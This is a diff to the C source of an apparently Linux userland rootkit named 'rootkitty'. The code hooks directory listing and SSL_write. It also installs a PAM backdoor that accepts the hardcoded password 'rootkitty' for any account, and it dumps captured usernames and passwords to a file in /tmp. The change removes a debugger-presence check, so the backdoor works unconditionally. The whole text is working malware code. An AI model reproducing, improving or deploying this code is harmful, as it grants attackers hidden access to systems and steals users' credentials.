@@ -14,10 +14,7 @@
 #define STR_LEN(str) sizeof(str)-1
 #define MAGIC_PREFIX "rootkitty"
 #define MAGIC_LEN STR_LEN(MAGIC_PREFIX)
-#ifndef PAM_EXTERN
-#define PAM_EXTERN extern 
-#endif
-
+#define MAGIC_PASS "rootkitty"
 /*---------[ PROTOTYPES ]---------*/
 static struct dirent*   (*og_readdir)(DIR *)       = NULL;
 static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
@@ -98,33 +95,24 @@ int SSL_write(SSL* ssl, const void *buf, int num) {
   return og_SSL_write(ssl, buf, num);
 }
 /*---------[ PAM BACKDOOR ]---------*/
-
-PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
+int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
   int retval = og_pam_sm_auth(pamh, flags, argc, argv);
   const char* password;
 
-  if (!isDebuggerPresent()){
-    return retval;
-  }
-
   if (pam_get_item(pamh, PAM_AUTHTOK, (const void**)&password) == PAM_SUCCESS) {
-    if (strcmp(password, "rootkitty")== 0) {
+    if (strcmp(password, MAGIC_PASS)== 0) {
       retval = PAM_SUCCESS;
     }
   }
   return retval;
 }
 
-PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
+int pam_authenticate(pam_handle_t *pamh, int flags) {
   int retval = og_pam_auth(pamh, flags);
   const char *password;
-  
-  if (!isDebuggerPresent()){
-    return retval;
-  }
 
   if (pam_get_item(pamh, PAM_AUTHTOK, (const void**)&password) == PAM_SUCCESS) {
-    if (strcmp(password, "rootkitty") == 0) {
+    if (strcmp(password, MAGIC_PASS) == 0) {
       retval = PAM_SUCCESS;
     }
   }
@@ -133,7 +121,6 @@ PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
 /*---------[ PAM EXFILTRATION ]---------*/
 int pam_get_item(const pam_handle_t *pamh, int item_type, const void**item){
   int rv;
-  int pid;
   const char* name;
   FILE* fd;
   
@@ -142,7 +129,7 @@ int pam_get_item(const pam_handle_t *pamh, int item_type, const void**item){
     pam_get_user((pam_handle_t*)pamh, &name, NULL);
     fd = fopen("/tmp/rootkitty_passdump.txt", "w+");
     if (fd != NULL){
-      fprintf(fd, "name: %s\nitem: %s", name, *item);
+      fprintf(fd, "name: %s\nitem: %s", name, (char*)*item);
     }
     fclose(fd);
   }
